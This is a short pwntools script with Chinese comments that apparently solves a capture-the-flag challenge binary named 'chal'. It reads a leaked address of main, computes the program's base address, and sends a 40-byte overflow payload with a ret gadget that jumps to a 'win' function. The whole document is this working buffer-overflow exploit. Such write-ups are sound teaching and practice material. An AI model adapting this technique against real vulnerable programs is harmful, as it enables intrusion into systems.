from pwn import *                          # ① 引入 pwntools

context.log_level = 'error'                # ② 少打点噪音

elf = ELF('./chal')                        # ③ 解析二进制

MAIN_STATIC = elf.symbols['main']          # ④ 静态地址
WIN_STATIC  = elf.symbols['win']
RET_STATIC  = 0x101a                       # ⑤ gadget，还是得 objdump 抄

OFFSET = 40                                # ⑥ gdb 量的

p = process('./chal')                      # ⑦ 启动进程

p.recvuntil(b'0x')                 # 等到 "0x" 出现
leaked = int(b'0x' + p.recvline().strip(), 16)                    
print(f"[*] 泄漏 = {hex(leaked)}")

base = leaked - MAIN_STATIC                # ⑩ 算基址
win  = base + WIN_STATIC
ret  = base + RET_STATIC
print(f"[*] win = {hex(win)}  ret = {hex(ret)}")

payload = b"A" * OFFSET                    # ⑪ 拼 payload
payload += p64(ret)                        # p64 = 打包成 8 字节小端
payload += p64(win)

p.sendline(payload)                        # ⑫ 发过去
print(p.recvall(timeout=2).decode(errors='replace'))   # ⑬ 收剩下的输出
